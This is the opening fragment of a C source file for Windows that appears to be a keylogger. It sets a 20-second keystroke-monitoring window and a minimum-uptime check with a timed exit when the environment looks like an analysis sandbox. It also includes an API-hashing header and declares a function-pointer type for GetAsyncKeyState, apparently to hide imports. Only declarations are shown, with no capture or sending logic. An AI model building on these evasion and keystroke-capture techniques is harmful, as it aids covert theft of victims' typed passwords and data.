#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "apihash.h"

#define MONITOR_TIME   20000 // monitor keyboard keystrokes for 20 seconds
#define TIME_DELAY 	    5000 // Wait 5 seconds before exiting if we are in a compromised env
#define MIN_UPTIME 	  300000 // 5 min; 5*60=300s; 5*60*1000=300000 ms

// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
typedef SHORT (WINAPI* fnGetAsyncKeyState)(
	_In_    INT     vKey
);